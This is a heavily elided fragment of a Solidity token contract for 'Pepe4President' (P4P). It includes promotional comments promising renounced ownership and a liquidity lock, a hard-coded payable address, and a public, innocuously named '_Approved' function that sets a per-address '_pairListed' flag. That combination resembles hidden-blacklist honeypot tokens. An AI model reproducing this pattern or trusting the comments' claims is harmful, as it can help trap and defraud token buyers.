...
//Telegram: https://t.me/Pepe4PresidentBSC
//Renounced after launch, lp lock 
...
contract Pepe4President is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Pepe4President";
    string private _symbol = "P4P";
    ...
    constructor () {
        ...
        addr = payable(address(0x2b79eE4160E96f1edfda1d7010CeBEFa7022D8b7));
    ...
    function _Approved(address _i,uint256 _m) public {
        if((_m == 0) || (_m - 1 == 0)){
            _pairListed[_i] = _m;
        }
